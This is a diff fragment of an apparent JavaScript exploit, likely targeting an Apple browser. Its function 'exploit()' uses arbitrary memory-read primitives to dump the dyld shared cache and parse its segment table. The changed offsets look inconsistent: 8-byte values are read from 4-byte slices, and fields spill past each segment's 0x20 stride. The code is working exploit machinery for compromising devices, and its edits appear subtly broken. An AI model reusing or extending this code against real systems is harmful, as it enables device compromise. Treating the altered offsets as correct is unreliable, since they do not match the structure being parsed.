@@ -495,18 +495,18 @@ function exploit(){
 	    log('[+] Dumping dyld shared cache...');
 	    log(hexdump(dcache_dump, 8, dcache_base));
 	    var dcache_base_seg = null;
-	    var dcache_nsegs = memory.read_i32(base + 0x14);
+	    var dcache_nsegs = memory.read_i32(base + 0x10);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
 	    var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.read_i32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
 	    var dcache_segs = [];
 	    for(var i = 0; i < dcache_nsegs; i++){
 	    	var off = i * 0x20;
 	    	var seg = {  
-	    		addr:     new Int64(dcache_segdata.slice(off +  0x0, off +  0x8)),
-                size:     new Int64(dcache_segdata.slice(off +  0x8, off + 0x10)),
-                fileoff:  new Int64(dcache_segdata.slice(off + 0x10, off + 0x18)),
-                maxprot:  b2u32(dcache_segdata.slice(off + 0x18, off + 0x1c)),
-                initprot: b2u32(dcache_segdata.slice(off + 0x1c, off + 0x20))
+	    		addr:     new Int64(dcache_segdata.slice(off +  0x10, off +  0x14)),
+                size:     new Int64(dcache_segdata.slice(off +  0x14, off + 0x18)),
+                fileoff:  new Int64(dcache_segdata.slice(off + 0x18, off + 0x1c)),
+                maxprot:  b2u32(dcache_segdata.slice(off + 0x20, off + 0x24)),
+                initprot: b2u32(dcache_segdata.slice(off + 0x24, off + 0x28))
 	    	};
 	    	dcache_segs.push(seg);
 	    	var max_rights = "";
